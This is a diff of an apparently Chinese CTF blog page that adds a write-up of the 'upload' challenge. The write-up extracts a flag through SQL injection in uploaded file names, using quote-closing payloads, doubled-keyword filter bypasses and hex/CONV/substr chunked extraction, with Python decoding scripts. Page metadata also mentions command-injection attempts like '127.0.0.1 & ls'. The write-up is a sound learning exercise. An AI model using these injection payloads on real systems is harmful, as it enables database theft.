@@ -48,7 +48,18 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-5.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-6.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-7.png">
-<meta property="og:updated_time" content="2019-10-24T14:49:49.256Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-11.png">
+<meta property="og:updated_time" content="2019-10-27T03:54:25.418Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界 — Web进阶题(第1-10关)">
 <meta name="twitter:description" content="Cat进入题目后给出一个输入框，输入IP地址后会返回PING的信息  此时想到了命令执行，但是尝试127.0.0.1 &amp;amp; ls、127.0.0.1 &amp;amp;&amp;amp; ls、127.0.0.1 | ls都会显示Invalid URL  网站用的是php写的，但是这个Cloud端就不一定是php的了。 在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=y，看来是可">
@@ -331,7 +342,69 @@
 <blockquote>
 <p>所以本题应该是采用 黑名单 + 检测文件内容&lt;?php 的方式</p>
 </blockquote>
-<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2>
+<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>进入题目后需要先注册，然后拿着注册的用户去登录，进入到上传页面。刚开始尝试了<code>php</code>、<code>png</code>、<code>gif</code>都提示：<code>Incorrect file extension!</code>，最后发现只有<code>jpg</code>后缀可以上传，上传成功之后，会显示我们上传的所有文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-1.png" alt="7-1"></p>
+<p>没有思路，看了别人的WriteUp才知道是<code>文件名注入</code></p>
+<p>我们上传文件，页面将我们上传的文件名返回，应该是查询了数据库。首先验证对参数的拼接，上传三个文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&quot; or 1=1 --+.jpg</span><br><span class="line">s&apos; or 1=1 --+.jpg</span><br><span class="line">s or 1=1 --+.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-2.png" alt="7-2"></p>
+<p>其中只有带<code>单引号</code>的没有返回，说明发生了构造，查询结果出乎服务器的预料。确认是单引号之后，就可以开始测试注语句</p>
+<blockquote>
+<p>测试的时候发现，必须要用 加号（+） 连接前后，如下：</p>
+<p>s’+(要执行的语句)+’</p>
+<p>除了要执行的语句以外，前后两部分是为了闭合单引号，也必须要用 加号 连接，否则语句会出错，导致无法回显内容</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(select database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-3.png" alt="7-3"></p>
+<p><code>select</code>被过滤掉了，尝试双写绕过成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(seselectlect database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-4.png" alt="7-4"></p>
+<p>但是会发现返回的结果为<code>0</code>，后来发现<code>select database()</code>的结果被系统设置为0</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-5.png" alt="7-5"></p>
+<p>执行常规注入表名的语句返回结果也是0，并且发现<code>from</code>也被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p>怀疑是否对返回的结果进行过滤（即检测为英文字母就过滤掉并返回0），所以尝试将返回结果进行转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect hex(database()))+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-6.png" alt="7-6"></p>
+<p>果然将结果处理为十六进制就能返回，将<code>十六进制转换为ASCII</code>，得到<code>web</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;7765625&quot;</span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">ascii_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,len(s),2):</span><br><span class="line">	if(len(s[i:i+2])==2):</span><br><span class="line">		hex_list.append(s[i:i+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		#输出web</span><br></pre></td></tr></table></figure>
+<p>得到数据库名称之后，注表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect hex(group_concat(table_name) frfromom information_schema.tables where table_schema=database()))+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p>成功提交后，刷新页面居然没有任何回显，现在开始怀疑是不是将我们转换为十六进制后的字母也过滤掉了</p>
+<p>试着将结果在转换为十进制（使用CONV()函数）</p>
+<blockquote>
+<p>CONV()函数用法：</p>
+<p>CONV(要转换的字符串，要转换的进制，转换后的进制)</p>
+</blockquote>
+<p>还是继续拿注数据库的语句进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(hex(database()),16,10))+&apos;.jpg</span><br></pre></td></tr></table></figure>
+<p>发现返回一个科学计数法的数字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-7.png" alt="7-7"></p>
+<p>想了一下，觉得是因为<code>数据库名</code>转换为<code>十六进制</code>对应的是两位两位（比如 web -&gt; 77 65 62），而CONV函数将十六进制整串转化为<code>十进制</code>，那这个数就非常大并且只能用科学技术法标识。想到了一个解决办法：<code>将十六进制的内容分段传给CONV函数能以十进制正常返回的范围</code>，这时候就需要借用到<code>substr()</code>函数，后来尝试最大只能是<code>12</code>位，开始注入：</p>
+<p><strong>注数据库</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&apos;.jpg</span><br><span class="line"></span><br><span class="line">#返回 131277325825392</span><br></pre></td></tr></table></figure>
+<p>果然回显成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-8.png" alt="7-8"></p>
+<p>第二部分（返回没有第一次长，应该是结束了）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&apos;.jpg</span><br><span class="line"></span><br><span class="line">#返回 1819238756</span><br></pre></td></tr></table></figure>
+<p>将两次返回的结果分别转换为ASCII</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s = [131277325825392,1819238756]</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[2:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">	for j in range(0,len(i),2):</span><br><span class="line">		hex_list.append(i[j:j+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		#输出 web_upload</span><br></pre></td></tr></table></figure>
+<p><strong>注表名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 112602976187180</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 114784820031327</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),25,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 112615676665705</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),37,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 126853610566245</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),49,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 48848364724837</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),61,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 29299</span><br></pre></td></tr></table></figure>
+<p>转换为 ASCII</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = [112602976187180,114784820031327,112615676665705,126853610566245,48848364724837,29299]</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[2:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">	for j in range(0,len(i),2):</span><br><span class="line">		hex_list.append(i[j:j+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line">print(flag)		#输出 files,hello_flag_is_here,members</span><br></pre></td></tr></table></figure>
+<p><strong>注列名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&apos;hello_flag_is_here&apos;)),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 115858377367398</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&apos;hello_flag_is_here&apos;)),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 7102823</span><br></pre></td></tr></table></figure>
+<p>使用如上代码，转换为 ASCII 结果为 <code>i_am_flag</code></p>
+<p><strong>注数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 36427215695199</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 92806431727430</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here)),25,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 560750951</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-9.png" alt="7-9"></p>
+<p>浏览器结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-10.png" alt="7-10"></p>
+<p>转换为 ASCII 结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-11.png" alt="7-11"></p>
+<p>拿到flag，直接提交不用加外套</p>
+<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2>
       
 
       
@@ -551,11 +624,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
